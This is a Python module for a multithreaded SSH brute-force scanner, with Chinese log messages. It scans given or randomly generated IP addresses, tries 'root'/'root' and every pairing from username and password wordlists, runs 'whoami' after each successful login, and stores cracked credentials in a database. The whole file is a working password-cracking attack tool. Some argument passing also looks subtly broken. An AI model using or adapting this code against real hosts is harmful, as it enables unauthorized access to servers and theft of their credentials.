import datetime
import json
import socket
import sys
import threading
import time
import traceback

import netaddr
import paramiko

import modules.mysqlOper as dbOper
import modules.GSystem as GEsys


class DateEnconding(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, datetime.date):
            return o.strftime('%Y/%m/%d')
        if isinstance(o, bytes):
            return str(o, encoding='utf-8')


class sshConnector(object):

    def addDatabase(self, e=None, result=None):
        global dbMutex
        dbMutex.acquire()
        # print(e, result)
        text = str(self.username) + "<==u-k==>" + str(self.password)
        if self.ip != self.host:
            self.text = "Domain:" + self.host + "\n" + text
        if e is not None:
            if dbOper.judgeSSHItemExists(self.host, str(self.port)) == '0':
                dbOper.record_item("ssh", self.host, self.port, str(e))
        if result is not None:
            dbOper.record_item("ssh", self.host, self.port, text)
        dbMutex.release()

    def addDatabaseLog(self, e):
        dbOper.record_log('ssh', '[W]', self.host, self.port, e)

    def __init__(self, host="127.0.0.1", port=22, username="_root_", password="_root_", timeout=30, crack=False,
                 final=False,
                 count=-1
                 ):

        self.host = host
        self.ip = socket.gethostbyname(self.host)
        self.port = int(port)
        self.username = username
        self.password = password
        self.crack = crack
        self.final = final
        self.timeout = timeout
        try:
            GEsys.System_Status = "尝试链接SSH:" + self.ip + "-" + str(self.port)
            threadResult[self.ip + "-" + str(self.port)][2] = self.final
            threadResult[self.ip + "-" + str(self.port)][1] = threadResult[self.ip + "-" + str(self.port)][1] + 1
            if threadResult[self.ip + "-" + str(self.port)][3] > 3:
                self.addDatabaseLog("SSH服务连接多次，但目标服务没有正确响应，跳过此端口" + self.ip + "-" + str(self.port))
                return
            self.ssh = paramiko.SSHClient()
            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh.banner_timeout = self.timeout
            self.ssh.handshake_timeout = self.timeout
            self.ssh.auth_timeout = self.timeout
            self.ssh.connect(hostname=str(host), port=port, username=username, password=password)
            self.result = "YES"
            if threadResult[self.ip + "-" + str(self.port)][3] > 3:
                return
            try:
                stdin, stdout, stderr = self.ssh.exec_command('whoami')
                time.sleep(1)
                self.result = stdout.read()
            except:
                pass

            threadResult[self.ip + "-" + str(self.port)][0] = True
            self.addDatabase(result=self.result)
            self.ssh.close()
        except paramiko.ssh_exception.NoValidConnectionsError as e:
            if str(e).find("Unable to connect") > 0 and threadResult[self.ip + "-" + str(self.port)][3] < 5:
                self.addDatabaseLog("此端口不存在SSH服务:" + str(e))
            threadResult[self.ip + "-" + str(self.port)][3] += 1
        except (TimeoutError, OSError):
            threadResult[self.ip + "-" + str(self.port)][3] += 1
        except paramiko.ssh_exception.AuthenticationException as e:
            self.addDatabaseLog(str(e))
            self.addDatabase(e=str(e))
        except (socket.timeout, paramiko.ssh_exception.SSHException) as e:
            self.addDatabaseLog("socket连接超时" + str(e))
        except ConnectionResetError as e :
            self.addDatabaseLog("socket连接超时重置" + str(e))
        except Exception as e:
            traceback.print_exc()
            self.addDatabaseLog(str(e))
        finally:
            pass
            # if threadResult[self.ip + "-" + str(self.port)][1] >= count:
            #     threadResult.pop(self.ip + "-" + str(self.port))


def startThread(method, url):
    global threadResult, dbMutex
    dbMutex = threading.Lock()
    threadResult = {}

    enable = GEsys.getConfigItem("sshScanners", "enable")
    threadCount = int(GEsys.getConfigItem("sshScanners", "threadCount"))
    delay = GEsys.getConfigItem("sshScanners", "delay")
    crash = GEsys.getConfigItem("sshScanners", "crash")
    timeout = GEsys.getConfigItem("sshScanners", "timeout")
    combinCount = 0
    if crash == "True":
        userlist = GEsys.Crack_File_Oper("ir", "getCrackUserFile", "ssh")
        pwdlist = GEsys.Crack_File_Oper("ir", "getCrackPasswordFile", "ssh")
        combinCount = len(userlist) + len(pwdlist)
    portList = GEsys.GOSScannerPort("ssh", "r")

    if enable != 'True':
        return
    if type(url) == netaddr.ip.IPNetwork:
        pass
    elif str(url) == 'random':
        url = GEsys.getRandomIp()

    if method == "extendScan":
        for port in portList:
            if type(url) == str:
                t = url
                url = list()
                url.append(t)
            for u in url:
                u = str(u)

                exists = dbOper.judgeSSHItemExists(u, port)
                if exists != 'null' and exists != '0':
                    splitUK = exists.split("<==u-k==>")
                    threading.Thread(target=innerThread,
                                     args=(u, port, splitUK[0], splitUK[1], crash, False, combinCount,)).start()

                try:
                    if threadResult[u + "-" + str(port)][0]:
                        continue
                except:
                    threadResult[u + "-" + str(port)] = [False, 0, False, 0]

                threading.Thread(target=innerThread,
                                 args=(u, port, "root", "root", timeout, False, True, -1)).start()
                # print(GEsys.threadInfo, u, port, GEsys.threadInfo["sshThreadNum"], threadCount)
                if GEsys.STOP:
                    return
                while GEsys.threadInfo["sshThreadNum"] > threadCount:
                    time.sleep(delay)

    if method == "fullScan":
        for port in portList:
            if type(url) == str:
                t = url
                url = list()
                url.append(t)
            for u in url:
                u = str(u)
                exists = dbOper.judgeSSHItemExists(u, port)
                if exists != 'null' and exists != '0':
                    splitUK = exists.split("<==u-k==>")
                    threading.Thread(target=innerThread,
                                     args=(u, port, splitUK[0], splitUK[1], crash, False, combinCount,)).start()
                try:
                    if threadResult[u + "-" + str(port)][0]:
                        continue
                except Exception as e:
                    threadResult[u + "-" + str(port)] = [False, 0, False, 0]

                exists = dbOper.judgeSSHItemExists(u, port)
                if exists != 'null' and exists != '0':
                    splitUK = exists.split("<==u-k==>")
                    threading.Thread(target=innerThread,
                                     args=(u, port, splitUK[0], splitUK[1], crash, False, combinCount,)).start()

                if crash == "True":
                    for usr in userlist:
                        for pwd in pwdlist:
                            combinCount *= len(portList)
                            try:
                                if threadResult[u + "-" + str(port)][0]:
                                    continue
                            except Exception as e:
                                threadResult[u + "-" + str(port)] = [False, 0, False, 0]
                            if usr == userlist[len(userlist) - 1] and pwd == pwdlist[len(pwdlist) - 1]:
                                threading.Thread(target=innerThread,
                                                 args=(u, port, usr, pwd, timeout, crash, True, combinCount,)).start()
                            else:
                                threading.Thread(target=innerThread,
                                                 args=(u, port, usr, pwd, timeout, crash, False, combinCount,)).start()
                            # print(GEsys.threadInfo, u, port, GEsys.threadInfo["sshThreadNum"], threadCount)
                            if GEsys.STOP:
                                return
                            while GEsys.threadInfo["sshThreadNum"] > threadCount:
                                time.sleep(delay)

                else:
                    threading.Thread(target=innerThread,
                                     args=(u, port, "root", "root", timeout, crash, True, -1,)).start()
                    # print(GEsys.threadInfo, u, port, GEsys.threadInfo["sshThreadNum"], threadCount)
                    if GEsys.STOP:
                        return
                    while GEsys.threadInfo["sshThreadNum"] > threadCount:
                        time.sleep(delay)


def innerThread(host, port, username, password, timeout, crack, final, Count=-1, ):
    GEsys.threadInfo["sshThreadNum"] = GEsys.threadInfo["sshThreadNum"] + 1
    try:
        sshConnector(host, port, username, password, timeout, crack, final, Count)
    except Exception as e:
        traceback.print_exc()

    GEsys.threadInfo["sshThreadNum"] = GEsys.threadInfo["sshThreadNum"] - 1


if __name__ == '__main__':
    # ip = list()
    # ip.append("192.168.2.223")
    # startThread("fullScan", ip)
    startThread("fullScan", "192.168.2.223")
